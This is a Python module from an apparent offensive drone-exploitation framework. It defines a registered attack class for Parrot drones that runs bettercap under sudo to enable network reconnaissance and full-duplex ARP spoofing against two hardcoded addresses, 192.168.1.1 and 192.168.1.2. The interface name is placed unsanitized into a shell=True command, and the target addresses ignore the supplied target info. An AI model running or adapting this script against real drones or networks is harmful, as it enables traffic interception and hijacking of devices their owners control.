from shared import Manufacturer, Model, AttackType, InterfaceMode, CommandExecutor
from modules.exploit.base_attack_script import BaseAttackScript, AttackResult, DroneTargetInfo
from modules.exploit.attack_factory import register_attack
import subprocess

@register_attack(
    manufacturer=Manufacturer.PARROT,
    models=[m.value for m in Model],
    attack_types=[AttackType.ARP_SPOOF],
)
class ArpSpoofAttackParrot(BaseAttackScript):
    def __init__(self, target_info: DroneTargetInfo):
        super().__init__(target_info); self.exec = CommandExecutor()

    def attack(self) -> AttackResult:
        # pre = self._ensure_interface_mode(InterfaceMode.MANAGED)
        # if not pre.status: return pre
        # cmd = f"bettercap -iface {self.target_info.interface} --target {self.target_info.drone_mac}"
        iface_name = self.target_info.interface.iface_name

        cmd = (
            f"sudo bettercap -iface {iface_name} "
            f"-eval 'set net.recon on; net.recon.start; "
            f"set arp.spoof.fullduplex true; "
            f"set arp.spoof.targets 192.168.1.1,192.168.1.2; "
            f"arp.spoof on;'"
        )



        subprocess.run(cmd, shell=True, check=True, text=True)
     
        # r = self.exec.execute(cmd, timeout=60, sudo=self.target_info.use_sudo)
        return AttackResult(True, "", "", "ARP spoofing executed")
